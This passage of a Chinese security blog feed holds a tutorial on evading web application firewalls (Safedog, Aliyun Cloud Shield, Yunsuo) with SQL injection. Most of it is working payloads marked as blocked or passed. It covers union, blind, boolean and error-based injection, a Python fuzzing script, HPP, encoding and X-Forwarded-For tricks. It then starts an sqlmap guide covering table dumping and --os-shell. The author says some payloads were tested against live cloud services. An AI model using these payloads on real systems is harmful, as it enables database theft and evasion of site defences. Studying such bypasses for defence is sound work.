不拦截\n\nhttp://192.168.59.129/Less-1/?id=1' union/*!11441/*!11440select*/ 1,2,3--+ 不拦截\n\nhttp://192.168.59.129/Less-1/?id=1' union/*!11440select*/ 1,2,3--+ 不拦截\n\nhttp://192.168.59.129/Less-1/?id=-1' union/*!11440/**/%0aselect*/ 1,2,3--+  不拦截\n\n</code></pre>\n<p>这句 bypass 的核心就在于版本号，然后你就感觉 fuzz 了千种姿势，但是核心还是这个，最简也是这个，万变不离其宗。<br />\n2. 注释绕过</p>\n<p>联想注释我们还知道有 -- # 那么他们可以利用吗，当然是肯定的，其实很久以前就有大佬发过这个语句了是<br />\n <code>union %23%0aselect</code>  因为这些都是单行注释，而 %0a 是换行的 url 编码，大家可以换行后用 url 编码看看，就是这个，<br />\n但是这样已经被加入规则库了，如何绕过呢 非常简单 当然这是个 fuzz 的过程，其实我只想写出思路，而不是直接给 payload。</p>\n<pre><code>union %23%0aselect 拦截\n\nunion %23select 拦截\n\nunion a%23 select 不拦截\n\nunion all%23 select 不拦截\n\nunion all%23%0a select 不拦截\n\nunion %23%0aall select 不拦截\n\n\n</code></pre>\n<p>有时候 fuzz 右边不行 不如看看左边 为什么可以加 all 这个你就得看看 mysql 手册了，其实测试到最后发现 %23%0a 中间不能加字符否则会被拦截。</p>\n<ol start=\"3\">\n<li>-- 注释绕过</li>\n</ol>\n<p>-- 其实大佬们也一样很早说了不过最初的姿势是  <code>-- %0a</code>  当然已经被加入豪华午餐了，所以我们来测试</p>\n<pre><code>union all -- %0a select 拦截\n\nunion  -- ()%0a select 拦截\n\nunion  -- 1%0a select 不拦截\n\nunion  -- hex()%0a select 不拦截\n\n</code></pre>\n<p>懂我意思吧，怎么绕出来，发挥你的现象，总之俩开花。</p>\n<ol start=\"4\">\n<li>老生常谈 hpp 被人遗忘的手法</li>\n</ol>\n<p>前面说过  <code>/**/</code>  里面的内容安全狗基本不管了，那么我们用 hpp 参数污染来绕过就很简单了<br />\n照成这个手法的原因是 web server 对参数的解析问题 在 php/apache 中 它总解析最后一个 id</p>\n<pre><code>http://192.168.59.129/Less-1/?id=-1' /*&amp;id='union select 1,user(),3 -- +*/\n\n</code></pre>\n<h1 id=\"0x03-注入\"><a class=\"anchor\" href=\"#0x03-注入\">#</a> 0x03 注入</h1>\n<p>既然绕过了  <code>union select</code>  那么注入就简单了 首先来看个  <code>user()</code>  , 因为它是被拦截的所以我们需要简单的绕过它</p>\n<pre><code>user()   拦截\nuser/**/() 拦截\nuser/**/(/**/) 拦截\nhex(user/**/(/**/)) 不拦截\n\n</code></pre>\n<p>接着就是爆库名</p>\n<pre><code>union  -- hex()%0a select 1,schema_name,3 from `information_schema`.schemata limit 1,1\n\n</code></pre>\n<p>接下来的流传都差不多了 关键点就是在于 from 后面这块 后面的我以这个  <code>information_schema.schemata</code>  为例展示几种思路可能有的不能过</p>\n<pre><code>`information_schema`.schemata\n`information_schema`.`schemata`\ninformation_schema.`schemata`\n(information_schema.schemata)\ninformation_schema/**/.schemata\n\n</code></pre>\n<h1 id=\"0x04-文末\"><a class=\"anchor\" href=\"#0x04-文末\">#</a> 0x04 文末</h1>\n<p>这么多手法又有多少人认真看了呢，认真去试过，探索。</p>\n<h1 id=\"0x00-延时过狗\"><a class=\"anchor\" href=\"#0x00-延时过狗\">#</a> 0x00 延时过狗</h1>\n<p>盲注过狗相对联合注入来说，感觉上是更简单，我们先来试试时间盲注把，比布尔稍稍灵活一点</p>\n<pre><code> if(1,1,1) 不拦截\n a if(1,1,1) 不拦截\n and if(1,1,1) 拦截\n | if(1,1,1) 不拦截\n || if(1,1,1) 拦截\n &amp;&amp; if(1,1,1) 拦截\n/*!and*/ if(1,1,1) 拦截\n /*!11440and*/ if(1,1,1) 不拦截\n andaif(1,1,1) 不拦截\n\n</code></pre>\n<p>通过上面的测试我们其实可以很简单的看出来 他是拦截的 xx if 这个语句，其中 xx 为 and 和 or 这 2 个词有点敏感，但是绕过还是可以的</p>\n<p>通过上一章的测试语句 发现版本为 11440 的 内联注释直接放行，咳咳这样后面就直接注入，感觉并不是我们这一章想要的，我们这一章来试试不用内联注释内不内绕过</p>\n<p>查阅乌云知识库发现一个小知识点  <code>and!!!1=1</code>  and 后面可以接上奇数个特殊的字符包括不限于 <code>! ~ &amp; -</code>  其他还可以自己测试 那么我们的 payload 就能构造出来了</p>\n<pre><code>and!!!if((substr((select hex(user/**/(/*!*/))),1,1)&gt;1),sleep/**/(/*!5*/),1)\n\n</code></pre>\n<p>系统函数怎绕过我就不多说了每一张就有</p>\n<h1 id=\"0x01-布尔过狗\"><a class=\"anchor\" href=\"#0x01-布尔过狗\">#</a> 0x01 布尔过狗</h1>\n<p>布尔注入过狗只能说是相对来说最简单的吧，因为可以不使用条件语句，少了一个绕过点</p>\n<pre><code>and!!!substr((select unhex(hex(user/**/(/*!*/)))),1,1)='r' 拦截\n\nand!!!substr((select unhex(hex(user/**/(/*!*/)))),1,1)=r 不拦截\n\nand!!!substr((select unhex(hex(user/**/(/*!*/)))),1,1)=1 不拦截\n\n\n</code></pre>\n<p>上面忘了说的就是这个点 =r 这里 不能使用引号，那绕过他就很简单了 什么 HEX ASCII 都行，通过测试发现 使用布尔盲注 他的过滤真的很差，我们试试 把 and 换成 &amp;&amp;</p>\n<pre><code>and substr((select hex(user/**/(/*!*/))),1,1)&gt;1 拦截\n\n/*!and*/ substr((select hex(user/**/(/*!*/))),1,1)&gt;1 拦截\n\n%26%26 substr((select hex(user/**/(/*!*/))),1,1)&gt;1 拦截\n\n/*!%26%26*/ substr((select hex(user/**/(/*!*/))),1,1)&gt;1 不拦截\n\n</code></pre>\n<h1 id=\"0x02-文末-3\"><a class=\"anchor\" href=\"#0x02-文末-3\">#</a> 0x02 文末</h1>\n<p>自己不测试 永远发现不了新东西</p>\n<h1 id=\"0x00-探索报错\"><a class=\"anchor\" href=\"#0x00-探索报错\">#</a> 0x00 探索报错</h1>\n<p>报错注入的绕过，感觉很少人提过，不少人绕过也有一定的误区吧，这里提一提</p>\n<pre><code>updatexml 不拦截\n\nupdatexml(1,2,3 不拦截\n\nupdatexml(1,2) 不拦截\n\nupdatexml(1,2,) 不拦截\n\nupdatexml(,2,1) 不拦截\n\nupdatexml(1,2,!) 拦截\n\nupdatexml(1,2,%) 拦截\n\nupdatexml(,2,1,hex()) 拦截\n\nand updatexml(1,2,3 不拦截\n\nupdatexml(1,2,3) 拦截\n\nand updatexml(1,2,3) 拦截\n\n\n</code></pre>\n<p>到这里我们 大概知道了，他的判断   <code>updatexml()</code>  的完整性 ，当里面按逗号分割出现出现 3 个字符时，就会拦截，当然有个别特殊的字符串他没过滤</p>\n<p>这样我们在括号里面做手脚的可能性很渺茫，那么我们还有 什么方法呢， 可以尝试把  <code>updatexml()</code>  函数分开，或者给 updatexml 加个外套。</p>\n<pre><code> /*updatexml*/(1,1,1) 不拦截\n\n /*!updatexml*/(1,1,1) 拦截\n\n /*!5000updatexml*/(1,1,1) 不拦截\n\n /*!11440updatexml*/(1,1,1) 不拦截\n\n</code></pre>\n<p>看来  <code>updatexml()</code>  函数我们已经绕过了 需要前面加个 运算符号了</p>\n<pre><code>and /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1)  拦截\n\nor /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 拦截\n\n/*!and*/ /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 拦截\n\n/*!%26%26*/ /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 不拦截\n\n/*!||*/ /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 不拦截\n\n/*!xor*/ /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 不拦截\n\n | /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 不拦截\n\n xor /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 不拦截\n\n</code></pre>\n<p>那么有没有什么可以包裹他的呢，其实我们查看 mysql 手册找到这么一个符号 开单引号 ASCII 96</p>\n<pre><code>http://192.168.130.135/Less-1/?id=1' and `updatexml`(1,(select hex(user/**/(/**/))),1)-- +\n\n</code></pre>\n<p>那么我们写个小脚本跑看看 还有没有</p>\n<pre><code>import requests\nimport urllib\n\nfor i in range(0,177):\n    url = r&quot;http://192.168.130.135/Less-1/?id=1%27%20xor%20&#123;fuzz&#125;updatexml&#123;fuzz&#125;(1,(select hex(user/**/(/**/))),1)--%20+&quot;.format(fuzz=urllib.quote(chr(i)))\n    req = requests.get(url)\n    if &quot;F6F7&quot; in req.text:\n        print len(req.text),i,urllib.quote(chr(i))\n\n</code></pre>\n<p>发现确实没有其他利用的了，当然你用前面的注释方法也是可行的</p>\n<h1 id=\"0x01-文末\"><a class=\"anchor\" href=\"#0x01-文末\">#</a> 0x01 文末</h1>\n<p>脚本只是你的一个思路衍生</p>\n<h1 id=\"0x00-矛与云盾过狗\"><a class=\"anchor\" href=\"#0x00-矛与云盾过狗\">#</a> 0x00 矛与云盾过狗</h1>\n<p>由于没有阿里云盾的试验环境，以下操作都在线上测试，总的来说阿里云还是比较不好绕的，因为对于 <code>/**/  /*!*/</code>  他是强过滤，根本不能用，我们先来测试简单语句</p>\n<pre><code>and 1=1 拦截\n\n&amp;&amp; 1=1 不拦截\n\nor 1=1 拦截\n\n|| 1=1 不拦截\n\nand 1 不拦截\n\nand 1= 拦截\n\nand = 拦截\n\nand 1&gt; 不拦截\n\nand 1&gt;1 拦截\n\nand 1&gt;a 拦截\n\nand 1&gt;! 不拦截\n\n</code></pre>\n<p>通过简单的测试我们发现，他对 &amp;&amp; || 过滤还是不是很严 ，and 的话是不让用直接接入 = 号的，综合一下前面的知识，我们可以想到几个方法。</p>\n<ol>\n<li>\n<p>不用 and 和 or</p>\n</li>\n<li>\n<p>用 and 在两边接入干扰字符</p>\n</li>\n</ol>\n<pre><code>and ~1=1   不拦截\n\nand!!!1=1  不拦截\n\nand 1-1    不拦截\n\nand true 不拦截\n\nand 1 不拦截\n\n</code></pre>\n<h1 id=\"0x01-注入\"><a class=\"anchor\" href=\"#0x01-注入\">#</a> 0x01 注入</h1>\n<ol>\n<li>盲注</li>\n</ol>\n<pre><code> and substr(1,1,1)='r' 拦截\n\n &amp;&amp;  substr(1,1,1)='r'  不拦截\n\n and!!!substr(1,1,1)='r' 不拦截\n\n and!!!substr((select),1,1)='r' 不拦截\n\n and!!!substr((select a()),1,1)='r' 不拦截\n\n and!!!substr((select user()),1,1)='r' 拦截\n\n\n</code></pre>\n<p>可以知道 select 后面加入 常见函数会被拦截，所以我们可以 使用一定的东西来分割他 但是 <code>/**/</code>  和 <code>/*!*/</code>  是不能用的，所以最后想到 就是 注释符号</p>\n<pre><code>and!!!substr((select user-- (1)%0a()),1,1)='r' 不拦截  edu\n\n\n</code></pre>\n<p>测试一会儿发现他对某些关键词拦截还是很严格的，绕过应该是可以的，一些生僻的函数加点东西 他就不会拦截</p>\n<pre><code>and!!!substr((select @@`datadir`),1,1)='D'-- + 拦截                     yq\nand!!!substr((select&#123;x @@datadir&#125;),1,1)='D' 不拦截\nand!!!substr((select&#123;x @@`datadir`&#125;),1,1)='D'-- + 不拦截\n\n</code></pre>\n<p>这里比较难的是 from 的绕过，虽然最后绕过了，但是感觉不是很完美</p>\n<pre><code>from 不拦截\n\nfrom user 不拦截\n\nselect from user 拦截                edu\n\nselect all from user 拦截\n\nselect from(user) 拦截\n\nselect from&#123;user&#125; 拦截\n\nselect from[user] 不拦截\n\nselect from [user] 拦截\n\n\n\n</code></pre>\n<p>最后想到 web+mysql 好像编码的问题 也能让解析我们的中文字符 但是这种对环境要求比较大</p>\n<pre><code>and!!!substr((select&#123;x username&#125;from（users） limit 0,1),1,1)='D'\n\nhttp://127.0.0.1/sqli/Less-1/?id=1%27 and!!!substr((select username from【users】 limit 0,1),3,1)='m'-- +\n\n</code></pre>\n<ol start=\"2\">\n<li>联合</li>\n</ol>\n<p>前面测试发现 内联注释不能使用了，只能靠括号之类的来干扰了</p>\n<pre><code>union select   不拦截\n\nunion select 1 拦截\n\nunion(select 1) 不拦截\n\nunion(select 1,2,3) 不拦截\n\n</code></pre>\n<ol start=\"3\">\n<li>报错</li>\n</ol>\n<pre><code>and `updatexml`(1,select `user`%0a(),1) \n</code></pre>\n<p><img data-src=\"2.4.1.png\" alt=\"mysql\" /></p>\n<p><img data-src=\"2.4.2.png\" alt=\"mysql\" /></p>\n<p>阿里云的需要深度探索才能绕过，规则还是比较困难的，相对于安全狗，因为 edu 和 yq 的云盾好像版本不同，绕过的手法也要不一样，具体思路就是这样的，由于我直接在官网测试的，所以可能有点问题。</p>\n<h1 id=\"我与云锁有个约会\"><a class=\"anchor\" href=\"#我与云锁有个约会\">#</a> 我与云锁有个约会</h1>\n<h2 id=\"0x00-简单and探索\"><a class=\"anchor\" href=\"#0x00-简单and探索\">#</a> 0x00 简单 and 探索</h2>\n<p>首先都是来测试下 and 的绕过</p>\n<pre><code>and 不拦截\n\nand 1 拦截\n\nand a 不拦截\n\nand 'a' 不拦截\n\nand 'a' &gt; &lt; =  拦截\n\n</code></pre>\n<p>差不多知道他的规则了 绕过来就很简单了</p>\n<pre><code>mysql&gt; select 'a'-0;\n+-------+\n| 'a'-0 |\n+-------+\n|     0 |\n+-------+\n1 row in set, 1 warning (0.00 sec)\n\nmysql&gt; select 'a'+1;\n+-------+\n| 'a'+1 |\n+-------+\n|     1 |\n+-------+\n1 row in set, 1 warning (0.00 sec)\n\nmysql&gt; select 'a'|1;\n+-------+\n| 'a'|1 |\n+-------+\n|     1 |\n+-------+\n1 row in set, 1 warning (0.00 sec)\n\n\nand 'a'-0  不拦截\n\nand 'a'|1  不拦截\n\n</code></pre>\n<h2 id=\"0x01-我与云锁有个约会\"><a class=\"anchor\" href=\"#0x01-我与云锁有个约会\">#</a> 0x01 我与云锁有个约会</h2>\n<p>早期云锁绕过非常简单，只需要在 post 和 get 同时提交数据 他会只检测 post 的内容，很轻松的绕过，但是更新后云锁也是很多人谈之色变的。</p>\n<p>以下内容都是把云锁的增强型防护开启</p>\n<ol>\n<li>简单的布尔盲注</li>\n</ol>\n<pre><code>and strcmp((substr((select user/**/()),2,1)),'0')\n\n</code></pre>\n<p>生僻函数绕过 这里比较难的点其实也在 from，但是比云盾好点，毕竟可以用到注释</p>\n<pre><code>http://192.168.130.135/Less-1/?id=1'  and strcmp((substr((select from),2,1)),'0')-- +  拦截\n\nhttp://192.168.130.135/Less-1/?id=1'  and strcmp((substr((select /*from*/),2,1)),'0')-- + 不拦截\n\n</code></pre>\n<p>看到这两条语句其实我们可以清楚的知道 <code>/**/</code>  是我们可以利用的点，结合前面的知识我们只需要把我们的 from 放在注释里面然后把注释不起作用就 OK</p>\n<pre><code>http://192.168.130.135/Less-1/?id=1'  and strcmp((substr((select password/* -- + %0afrom/**/users limit 0,1),1,1)),'D')-- +\n\n</code></pre>\n<p><img data-src=\"2.5.1.png\" alt=\"mysql\" /></p>\n<ol start=\"2\">\n<li>时间盲注</li>\n</ol>\n<p>时间盲注换换就行</p>\n<pre><code>http://192.168.130.135/Less-1/?id=1'  and if((strcmp((substr((select password/* -- + %0afrom/**/users limit 0,1),1,1)),'D')),1,sleep(5))-- +\n\n</code></pre>\n<ol start=\"3\">\n<li>报错注入</li>\n</ol>\n<pre><code>http://192.168.130.135/Less-1/?id=1'  and `updatexml`(1,concat(0x7e,(select user/**/()),0x7e),1)/**/-- +\n\n</code></pre>\n<p>其他的自己探索吧，bypass 也就一个知识量和思路的结合</p>\n<p><img data-src=\"2.5.2.png\" alt=\"mysql\" /></p>\n<h1 id=\"0x00-拓展bypass的常用思路\"><a class=\"anchor\" href=\"#0x00-拓展bypass的常用思路\">#</a> 0x00 拓展 Bypass 的常用思路</h1>\n<p>WAF 的绕过我们无非就是利用 WEB 程序缺陷，容器特性，网络协议，数据库特性来组合利用绕过，从用户发出请求到数据库的每一点，寻找突破口。</p>\n<h1 id=\"0x01-常见的手段\"><a class=\"anchor\" href=\"#0x01-常见的手段\">#</a> 0x01 常见的手段</h1>\n<ol>\n<li>\n<p>HTTP 协议</p>\n</li>\n<li>\n<p>大小混写</p>\n</li>\n<li>\n<p>替换</p>\n</li>\n<li>\n<p>使用特殊字符</p>\n</li>\n<li>\n<p>使用编码</p>\n</li>\n<li>\n<p>等价替换</p>\n</li>\n<li>\n<p>容器特性</p>\n</li>\n<li>\n<p>白名单</p>\n</li>\n<li>\n<p>缓冲溢出</p>\n</li>\n</ol>\n<p>等等</p>\n<h2 id=\"http协议\"><a class=\"anchor\" href=\"#http协议\">#</a> HTTP 协议</h2>\n<p>HTTP 协议中有很多功能，一般来说我们可以用到的就是编码功能，后来有大佬发现了分块传入来绕过 WAF，具体大家可以百度看看，大概 http 协议我们可以总结如下。</p>\n<ol>\n<li>\n<p>构造畸形数据包</p>\n</li>\n<li>\n<p>编码</p>\n</li>\n<li>\n<p>分块</p>\n</li>\n<li>\n<p>数据包溢出</p>\n</li>\n</ol>\n<p>可能有些表述有误，但是大概意思如此，构造畸形数据包的原理是 http 协议是有一定的容错性的，我们也常用这个容错性去绕过上传。编码绕过的原理也是利用程序解密，而 waf 识别不了，数据包溢出则是数据包过大 waf 自动丢弃不识别</p>\n<h2 id=\"大小混写\"><a class=\"anchor\" href=\"#大小混写\">#</a> 大小混写</h2>\n<p>大小混写一般是绕过一些简单的正则 ，对大小写敏感的。</p>\n<pre><code>UnIon SlEct \n\n</code></pre>\n<h2 id=\"替换\"><a class=\"anchor\" href=\"#替换\">#</a> 替换</h2>\n<p>这种一般是因为正则吧我们的关键词给替换删除了，但是没有进行多次匹配导致绕过</p>\n<pre><code>ununionion seselectlect\n\nun/**/ion se/**/lect\n\n</code></pre>\n<h2 id=\"特殊字符\"><a class=\"anchor\" href=\"#特殊字符\">#</a> 特殊字符</h2>\n<p>特殊符号也多是数据库的特性，利用数据库可以使用多种符号来绕过，多种的运算符</p>\n<pre><code>`updatexml`\n\nand!!!1=1\n\n/**/\n\n/*!50000*/\n\n</code></pre>\n<h2 id=\"使用编码\"><a class=\"anchor\" href=\"#使用编码\">#</a> 使用编码</h2>\n<p>这里和 http 协议差不多，多重编码等等，url 编码会自己解码一次，但是有的程序他可以自己多次解密，那么我们就可以拿来利用<br />\n还有的程序参数他是支持 base64 的 那么我们的 payload 就可以编码绕过了</p>\n<pre><code>= -&gt; %3D -&gt;%25%33%44\n\nand 1=1 -&gt; YW5kIDE9MQ==\n\n</code></pre>\n<h2 id=\"等价替换\"><a class=\"anchor\" href=\"#等价替换\">#</a> 等价替换</h2>\n<p>mysql 众多的函数也我们的 bypass 带来了很对便利，比如一个分割字符串的函数都是几个，倘若被过滤一个可以换成其他的</p>\n<pre><code>substr(version(),1,1)\nSubstring(version(),1,1)\nLeft(version(),1)\n\n</code></pre>\n<h2 id=\"容器特性\"><a class=\"anchor\" href=\"#容器特性\">#</a> 容器特性</h2>\n<ol>\n<li>iis</li>\n</ol>\n<p>容器的特性给我们绕过非常的有帮助，感谢那些善于发现的师傅们。</p>\n<pre><code>iis+asp 的%特性：当传入的 s%e%l%e%c%t 函数被%分割时，解析出来还是select\niis+asp 的unicode特性 ： iis支持Unicode的解析 我们传入s%u0065lect解析为select\n\n    +--------------------------------------------------------------------+\n    |   Keywords     |        WAF             |  ASP/ASP.NET             |\n    +--------------------------------------------------------------------+\n    | sele%ct * fr%om..  | sele%ct * fr%om..      | select * from..      |\n    | ;dr%op ta%ble xxx  | ;dr%op ta%ble xxx      | ;drop table xxx      |\n    | &lt;scr%ipt&gt;      | &lt;scr%ipt&gt;                  | &lt;script&gt;             |\n    | &lt;if%rame&gt;      | &lt;if%rame&gt;                  | &lt;iframe&gt;             |\n    +--------------------------------------------------------------------+\n\n</code></pre>\n<ol start=\"2\">\n<li>hpp</li>\n</ol>\n<p>hpp 参数污染，前面我们绕过安全狗用到过，不同容器对我们传入的值解析顺序不同，这也是我们可以利用的</p>\n<pre><code>    php+apache    &amp;id=1&amp;id=2     他只解析最后一个\n\n\n    +------------------------------------------------------------------+\n    | Web Server      | Parameter Interpretation         | Example     |\n    +------------------------------------------------------------------+\n    | ASP.NET/IIS     | Concatenation by comma       | par1=val1,val2  |\n    | ASP/IIS         | Concatenation by comma       | par1=val1,val2  |\n    | PHP/Apache      | The last param is resulting  | par1=val2       |\n    | JSP/Tomcat      | The first param is resulting | par1=val1       |\n    | Perl/Apache     | The first param is resulting | par1=val1       |\n    | DBMan           | Concatenation by two tildes  | par1=val1~~val2 |\n    +------------------------------------------------------------------+\n\n</code></pre>\n<ol start=\"3\">\n<li>HTTP Parameter Contamination</li>\n</ol>\n<p>不同的容器他会对我们的参数带入的一些特殊字符解析成不同的东西，比如</p>\n<pre><code>    +-----------------------------------------------------------+\n    | Query String    |    Web Servers response / GET values    |\n    +-----------------------------------------------------------+\n    |         | Apache/2.2.16, PHP/5.3.3 | IIS6/ASP             |\n    +-----------------------------------------------------------+\n    | ?test[1=2       | test_1=2             | test[1=2         |\n    | ?test=%         | test=%               | test=            |\n    | ?test%00=1      | test=1               | test=1           |\n    | ?test=1%001     | NULL                 | test=1           |\n    | ?test+d=1+2     | test_d=1 2           | test d=1 2       |\n    +-----------------------------------------------------------+\n\n</code></pre>\n<h2 id=\"白名单\"><a class=\"anchor\" href=\"#白名单\">#</a> 白名单</h2>\n<p>有的程序他会对本地 ip 不拦截，同时他的 host 使用 <code>X-Forwarded-For</code>  等来获取</p>\n<pre><code>X-Forwarded-For:127.0.0.1\n\n</code></pre>\n<h2 id=\"缓冲溢出\"><a class=\"anchor\" href=\"#缓冲溢出\">#</a> 缓冲溢出</h2>\n<p>waf 他处理数据包的大小有限，早期安全狗你提交过长 url 会直接奔溃</p>\n<pre><code>?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26\n\n</code></pre>\n<h2 id=\"参考文章\"><a class=\"anchor\" href=\"#参考文章\">#</a> 参考文章</h2>\n<ol>\n<li>\n<p>Obfuscate and Bypass ： <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vcGFwZXJzLzE3OTM0\">https://www.exploit-db.com/papers/17934</span></p>\n</li>\n<li>\n<p>9 ways to bypass Web Application Firewall：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZGlnaXRhbG11bml0aW9uLm1lLzIwMTgvMDIvc3FsLWluamVjdGlvbi05LXdheXMtYnlwYXNzLXdlYi1hcHBsaWNhdGlvbi1maXJld2FsbC8=\">https://www.digitalmunition.me/2018/02/sql-injection-9-ways-bypass-web-application-firewall/</span></p>\n</li>\n</ol>\n<h1 id=\"0x02-文末-4\"><a class=\"anchor\" href=\"#0x02-文末-4\">#</a> 0x02 文末</h1>\n<p>bypass 不要局限与一种，多种组合才能最大利用，你需要了解 mysql 的语法，特殊的符号，特殊的写法，FUZZ 他可以容错的地方</p>\n",
            "tags": [
                "sql注入"
            ]
        },
        {
            "id": "https://or0kit.github.io/PenetrationTest/Web-Security/SQLMAP%E6%80%BB%E7%BB%93/",
            "url": "https://or0kit.github.io/PenetrationTest/Web-Security/SQLMAP%E6%80%BB%E7%BB%93/",
            "title": "SQLMAP总结",
            "date_published": "2020-12-05T06:40:14.000Z",
            "content_html": "<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<blockquote>\n<p>总结一下 SQLmap 的使用方法。</p>\n</blockquote>\n<h1 id=\"sqlmap的简介\"><a class=\"anchor\" href=\"#sqlmap的简介\">#</a> Sqlmap 的简介</h1>\n<p>Sqlmap 是一种开源的渗透测试工具，可以自动检测和利用 SQL 注入漏洞以及接入该数据库的服务器。它拥有非常强大的检测引擎、具有多种特性的渗透测试器、通过数据库指纹提取访问底层文件系统并通过外带连接执行命令。</p>\n<p>支持的数据库：MySQL，Oracle, PostgreSQL, Microsoft SQL Ser ver, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase and SAP MAXDB。</p>\n<p>sqlmap 支持五种不同的注入模式：</p>\n<ul>\n<li>UNION query SQL injection（可联合查询注入）</li>\n<li>Error-based  SQL injection（报错型注入）</li>\n<li>Boolean-based  blind SQL injection（布尔型注入）</li>\n<li>Time-based  blind SQL injection（基于时间延迟注入）</li>\n<li>Stacked queries SQL injection（可多语句查询注入）</li>\n</ul>\n<h1 id=\"sqlmap使用\"><a class=\"anchor\" href=\"#sqlmap使用\">#</a> SQLMAP 使用</h1>\n<h2 id=\"设置目标\"><a class=\"anchor\" href=\"#设置目标\">#</a> 设置目标</h2>\n<ul>\n<li>\n<p>-u /--url 最基本格式 python sqlmap.py-u “<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy50YXJnZXQuY29tL2luZGV4LnBocD9pZD0xJUUyJTgwJTlE\">http://www.target.com/index.php?id=1”</span></p>\n</li>\n<li>\n<p>-m 从文本中获取多个目标扫描，但是每一行一个 url。sqlmap-m “urllist.txt”</p>\n</li>\n<li>\n<p>-r 从文件中加载 HTTP 请求，这样的话就不需要在去设定 Cookie,POST 数据...... 等等.sqlmap–r  “/tmp/1.txt”</p>\n</li>\n</ul>\n<h2 id=\"设置回显等级\"><a class=\"anchor\" href=\"#设置回显等级\">#</a> 设置回显等级</h2>\n<p>参数：-v 默认为 1：</p>\n<ul>\n<li>0、只显示 python 错误以及严重的信息。</li>\n<li>1、同时显示基本信息和警告信息。（默认等级）</li>\n<li>2、同时显示 debug 信息。</li>\n<li>3、同时显示注入的 payload。</li>\n<li>4、同时显示 HTTP 请求。</li>\n<li>5、同时显示 HTTP 响应头。</li>\n<li>6、同时显示 HTTP 响应页面。</li>\n</ul>\n<h2 id=\"设置http数据包相关参数\"><a class=\"anchor\" href=\"#设置http数据包相关参数\">#</a> 设置 HTTP 数据包相关参数</h2>\n<p>参数：--data<br />\n 此参数是把数以 POST 方式提交，sqlmap 会像检测 GET 参数一样检测 POST 过去的参数。</p>\n<p><code>python sqlmap.py-u &quot;http://www.target.com/vuln.php&quot; --data=&quot;id=1” </code></p>\n<p>参数：--cookie<br />\n 当 web 需要登录的时候，需要我们抓包获取 cookie 参数，然后复制出来，加到 --cookie 参数中。</p>\n<p>参数：--user-agent<br />\n 默认情况下 sqlmap 的 HTTP 请求头中的 User-Agent 值是： <code>sqlmap/1.0-dev-xxxxxxxxx(http://sqlmap.org)</code> <br />\n 这个时候可以手动指定伪造一个 User-Agent。</p>\n<p><code>sqlmap-u “http://www.target.com” --level  3 --user-agent=”aaaaaa” --dbs</code></p>\n<p>参数：--random-agent<br />\n 会从 sqlmap/txt/user-agents.txt 中随机产生 User-Agent 头。</p>\n<p>参数：--referer<br />\nsqlmap 可以在请求中伪造 HTTP 中的 referer。当 --level 参数设定 &gt;=3 时，会尝试进行 referer 注入。</p>\n<p><code>sqlmap-u “http://www.target.com” --leve3 --referer=”www.baidu.com” –dbs</code></p>\n<p>参数：--delay<br />\n 可以设定两个 http 请求间的延迟，设定为 1 的时候是 1 秒，默认是没有延迟的。</p>\n<p>参数：--timeout<br />\n 可以设定一个 http 请求超过对久判定为超时，默认是 30 秒。</p>\n<h2 id=\"设定探测等级\"><a class=\"anchor\" href=\"#设定探测等级\">#</a> 设定探测等级</h2>\n<p>参数：--level</p>\n<p>共有五个等级，默认为 1，sqlmap 使用的 payload 可以在 xml/payloads.xml 中看到，自己也可以根据相应的格式添加自己的 payload。<br />\nlevel&gt;=2 的时候就会测试 HTTP  Cookie。<br />\nlevel&gt;=3 的时候就会测试 HTTP  User-Agent/Referer 头。<br />\nlevel=5 的时候会测试 HTTP Host。</p>\n<h2 id=\"设定探测风险等级\"><a class=\"anchor\" href=\"#设定探测风险等级\">#</a> 设定探测风险等级</h2>\n<p>参数：--risk</p>\n<p>共有四个风险等级，默认是 1 会测试大部分的测试语句，2 会增加基于时间的测试语句，3 会增加 OR 语句的 SQL 注入测试。<br />\n在有些时候，例如在 UPDATE 的语句中，注入一个 OR 的测试语句，可能导致更新的整个表，可能造成很大的风险。</p>\n<h2 id=\"列数据\"><a class=\"anchor\" href=\"#列数据\">#</a> 列数据</h2>\n<p>--dbs 列出所有数据库名称<br />\n --current-db 列出当前数据库名称</p>\n<p>--tables -D database_name #列表名<br />\n --columns -T table_name-D database_name   #列字段<br />\n --dump -C column_1,column_2 -T table_name-D database_name #获取字段内容</p>\n<h2 id=\"一些常用的参数\"><a class=\"anchor\" href=\"#一些常用的参数\">#</a> 一些常用的参数</h2>\n<p>-users 列数据库管理用户，当前用户有权限读取包含所有用户的表的权限时，就可以列出所有管理用户。<br />\n--current-user 在大多数据库中可以获取到管理数据的用户 (当前用户)。<br />\n--is-dba 判断当前的用户是否为管理，是的话会返回 True。<br />\n--privileges 当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的权限，sqlmap 将会告诉你哪个是数据库的超级管理员。也可以用 - U 参数指定你想看那个用户的权限。<br />\n--proxy 指定一个代理服务器<br />\n <code>eg: –proxy http://local:8080</code> <br />\n--prefix=PREFIX  注入 payload 字符串前缀<br />\n --suffix=SUFFIX  注入 payload 字符串后缀<br />\n <code>eg：sqlmap-u “www.target.com/index.php?id=1” -p id --prefix “')”--suffix “AND ('1'='1”</code></p>\n<h2 id=\"使用shell命令\"><a class=\"anchor\" href=\"#使用shell命令\">#</a> 使用 Shell 命令</h2>\n<p>参数：--os-shell</p>\n<p>前提：需要网站的物理路径，其次是需要有 FIFE 权限。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>sqlmap-r “C:<span class=\"token punctuation\">\\</span>sqlmap<span class=\"token punctuation\">\\</span>request.txt” -p <span 